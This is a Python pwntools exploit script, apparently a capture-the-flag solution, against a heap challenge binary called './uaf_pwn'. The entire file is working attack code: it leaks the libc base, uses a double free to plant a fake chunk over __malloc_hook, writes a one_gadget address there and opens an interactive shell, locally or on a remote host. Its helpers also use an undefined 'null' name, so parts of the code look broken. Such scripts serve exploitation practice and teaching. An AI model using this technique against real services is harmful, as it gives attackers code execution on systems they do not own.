#!/usr/bin/python3
# -*- coding: UTF-8 -*-
# -----------------------------------
# @File    :  exp.py
# @Author  :  woodwhale
# @Time    :  2021/09/30 15:33:33
# -----------------------------------

from pwn import *
from LibcSearcher import *
import sys, subprocess

arglen = len(sys.argv)
def ret2libc(leak,func,binary=null):
    libc = LibcSearcher(func,leak) if binary == null else binary
    base = leak - libc.dump(func) if binary == null else leak - libc.sym[func]
    system = base + libc.dump('system') if binary == null else base + libc.sym['system']
    binsh = base + libc.dump('str_bin_sh') if binary == null else next(libc.search(b'/bin/sh'))
    return (system,binsh)

s = lambda data : io.send(data)
sa = lambda rv,data : io.sendafter(rv,data)
sl = lambda data : io.sendline(data)
sla = lambda rv,data : io.sendlineafter(rv,data)
r = lambda num : io.recv(num)
rl = lambda keepends=True : io.recvline(keepends)
ru = lambda data,drop=True : io.recvuntil(data,drop)
ia = lambda : io.interactive()
uu32 = lambda data : u32(data.ljust(4,b'\x00'))
uu64 = lambda data : u64(data.ljust(8,b'\x00'))
i16 = lambda data : int(data,16)
leak = lambda name,addr : log.success('\033[33m{}\033[0m = \033[31m{:#x}\033[0m'.format(name, addr))
dbg = lambda point=null: (gdb.attach(io) if point == null else gdb.attach(io,f'b {point}')) if DEBUG else null
og = lambda binary : list(map(int,subprocess.check_output(['one_gadget','--raw','-f',binary]).decode().strip('\n').split(' ')))
rg = lambda binary,only,grep : i16(subprocess.check_output([f"ROPgadget --binary {binary} --only '{only}' | grep {grep}"],shell=True).decode().split(' ')[0])
setlibc = lambda leak,func : leak - libc.sym[func]
libcpath = lambda binary : subprocess.check_output(['ldd',binary]).decode().replace('\t', '').split('\n')[1].split(' ')[2] if GLIBC else subprocess.check_output(['ls | grep *.so'],shell=True).decode().replace('\n', '')
proc = lambda binary,libc=null : process(binary) if GLIBC else process(binary,env={'LD_PRELOAD':'./'+libc})

# context.arch='amd64'
# context.log_level='debug'
context.terminal = ['gnome-terminal','-x', 'bash','-c']
# 0直接略过所有dbg
DEBUG = 0
# 0表示使用当前目录下的libc，1表示使用patcher之后的glibc
GLIBC = 1
binary = './uaf_pwn'
elf = ELF(binary)
libc = ELF(libcpath(binary))
libc.path = libcpath(binary)
io = proc(binary,libc.path) if arglen == 1 else (remote(sys.argv[1].split(':')[0],sys.argv[1].split(':')[1]) if arglen == 2 else remote(sys.argv[1],sys.argv[2]))

def add(size):
    sla(">","1")
    sla("size>",str(size))
    
def free(index):
    sla(">","2")
    sla("index>",str(index))

def edit(index,content="a"):
    sla(">","3")
    sla("index>",str(index))
    sla("content>",content)

def show(index):
    sla(">","4")
    sla("index>",str(index))

stack = i16(rl())
leak("stack",stack)

add(0x430) # 0 unsorted bin
add(0x60) # 1
add(0x60) # 2
add(0x10) # 3

free(0)
show(0)

libc.address = uu64(r(6))-(0x7f1719461b78-0x7f171909d000)
leak("base",libc.address)

add(0x430) # 4->0
free(1)
free(2)
free(1)
dbg()

edit(1,p64(libc.sym["__malloc_hook"]-0x23))
add(0x60) # 5->1
add(0x60) # 6 fake_chunk

edit(6,b"c"*19+p64(og(libc.path)[1]+libc.address))
add(0x10)
dbg()

ia()